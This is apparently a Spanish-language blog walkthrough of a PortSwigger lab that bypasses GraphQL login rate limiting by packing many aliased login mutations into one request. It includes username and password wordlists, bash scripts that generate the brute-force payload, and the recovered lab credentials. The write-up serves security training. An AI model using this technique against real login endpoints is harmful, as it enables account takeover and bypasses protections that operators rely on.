---
title: Bypassing GraphQL brute force protections
description: Laboratorio de Portswigger sobre GraphQL API
date: 2025-02-28 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - GraphQL API
tags:
  - Portswigger Labs
  - GraphQL API
  - Bypassing GraphQL brute force protections
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` utiliza un mecanismo de `inicio` de `sesión` impulsado por una `API GraphQL`. El `endpoint` de la `API` devuelve un `error` si recibe demasiadas `solicitudes` desde el mismo `origen` en un corto período de tiempo. Para `resolver` el `laboratorio`, debemos realizar un `ataque de fuerza bruta` contra el `login` para `iniciar sesión` como el usuario `carlos`. 
Utilizaremos un `diccionario` de `contraseñas` [https://portswigger.net/web-security/authentication/auth-lab-passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) y un `diccionario` de `usuarios` [https://portswigger.net/web-security/authentication/auth-lab-usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames). Podemos `loguearnos` usando las credenciales `wiener:peter`

---

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/GraphQL-API-Lab-4/image_1.png)

Si hacemos click sobre `My account`, nos podemos `loguear` con las credenciales `wiener:peter`

![](/assets/img/GraphQL-API-Lab-4/image_2.png)

En `Burpsuite` con la extensión `Logger ++` vemos que se ha `tramitado` esta `petición` a `GraphQL`

![](/assets/img/GraphQL-API-Lab-4/image_3.png)

Si `pulsamos` sobre la `pestaña GraphQL` vemos que tenemos una `mutation` y la `variables` que se le `proporcionan` en la `parte inferior`

![](/assets/img/GraphQL-API-Lab-4/image_4.png)

`Modificamos` la `petición` para `mandar` todos los `datos` directamente `sin usar variables`

![](/assets/img/GraphQL-API-Lab-4/image_5.png)

También podríamos enviar la `petición` así, la `diferencia` entre esta `petición` y la `anterior` es que en esta hemos `borrado` el `operationName`

![](/assets/img/GraphQL-API-Lab-4/image_6.png)

`Si enviamos la petición varias veces seguidas nos bloquea` y tenemos que esperar `1 minutos` para poder seguir mandando peticiones. `Por esto, no podemos hacer un ataque de fuerza bruta desde el Intruder`

![](/assets/img/GraphQL-API-Lab-4/image_7.png)

Por lo general, `los objetos GraphQL no pueden contener varias propiedades con el mismo nombre`. `Los alias nos permiten eludir esta restricción nombrando explícitamente las propiedades que desea que la API devuelva`. Si bien los `alias` están `destinados` a `limitar` la `cantidad` de `peticiones` a la `API` que necesitamos realizar, también se pueden usar para `bruteforcear` un `endpoint` de `GraphQL`. `Los endpoints usualmente implementan medidas de seguridad contra los ataques de fuerza bruta`, hay ocasiones en las que se `bloquea` al `usuario` en función de la `cantidad de solicitudes HTTP` que haga al servidor en lugar de la `cantidad de operaciones realizadas contra el endpoint`. Podemos usar de los `alias` para esta situación porque `podemos enviar una sola petición HTTP que realice varias consultas` y de esta forma `evitar` que nos `bloqueen`

![](/assets/img/GraphQL-API-Lab-4/image_8.png)

Para `automatizar` esto vamos a crear un `script` en `bash` que nos lea el `itere` sobre un `diccionario` de `contraseñas` [https://portswigger.net/web-security/authentication/auth-lab-passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) y un `diccionario` de `usuarios` [https://portswigger.net/web-security/authentication/auth-lab-usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames) y nos `cree` la `estructura` que `deseamos`. Lo primero que tenemos que hacer es `copiarnos` el `contenido` del `diccionario` de `usuarios` en un `archivo` llamado `usernames.txt`

```
carlos
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser
academico
acceso
access
accounting
accounts
acid
activestat
ad
adam
adkit
admin
administracion
administrador
administrator
administrators
admins
ads
adserver
adsl
ae
af
affiliate
affiliates
afiliados
ag
agenda
agent
ai
aix
ajax
ak
akamai
al
alabama
alaska
albuquerque
alerts
alpha
alterwind
am
amarillo
americas
an
anaheim
analyzer
announce
announcements
antivirus
ao
ap
apache
apollo
app
app01
app1
apple
application
applications
apps
appserver
aq
ar
archie
arcsight
argentina
arizona
arkansas
arlington
as
as400
asia
asterix
at
athena
atlanta
atlas
att
au
auction
austin
auth
auto
autodiscover
```

Hacemos lo mismo con el `fichero` de `contraseñas`

```
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow
```

Una vez hecho esto creamos este `script` que `itera` sobre todos los `usuarios` del archivo `usernames.txt`, `crea` una `estructura` para que `funcione` en `GraphQL` y nos `almacena` en un `archivo` todo el `output`

```
#!/bin/bash

usernames_file="usernames.txt"
passwords_file="passwords.txt"
output_file="output.txt"
counter=1

echo "mutation {" > "$output_file"

while IFS= read -r username; do
    while IFS= read -r password; do
        echo "    request_${counter}:login(input: {username:\"${username}\",password:\"${password}\"}) {" >> "$output_file"
        echo "        token" >> "$output_file"
        echo "        success" >> "$output_file"
        echo -e "    }\n" >> "$output_file"
        ((counter++))
    done < "$passwords_file"
done < "$usernames_file"

echo "}" >> "$output_file"
```

Si solo queremos `generar payloads para un usuario específico` podemos usar este otro `script`

```
#!/bin/bash

username="carlos"
passwords_file="passwords.txt"
output_file="output.txt"
counter=1

echo "mutation {" > "$output_file"

while IFS= read -r password; do
    echo "    request_${counter}:login(input: {username:\"${username}\",password:\"${password}\"}) {" >> "$output_file"
    echo "        token" >> "$output_file"
    echo "        success" >> "$output_file"
    echo -e "    }\n" >> "$output_file"
    ((counter++))
done < "$passwords_file"

echo "}" >> "$output_file"
```

Para `copiar` todo el `contenido` que se `almacena` en el `archivo`, como son `muchas líneas` es recomendable hacerlo con este `comando`

```
# xclip -sel clip -i output.txt
```

Una vez `generado` el `payload`, lo `pegamos` en la `pestaña` de `GraphQL`, `en la respuesta filtramos por true y en la petición filtramos por el número de petición`. Las `credenciales` que hemos obtenido son `carlos:654321`

![](/assets/img/GraphQL-API-Lab-4/image_9.png)

Nos `logueamos` como el usuario `carlos`

![](/assets/img/GraphQL-API-Lab-4/image_10.png)

![](/assets/img/GraphQL-API-Lab-4/image_11.png)
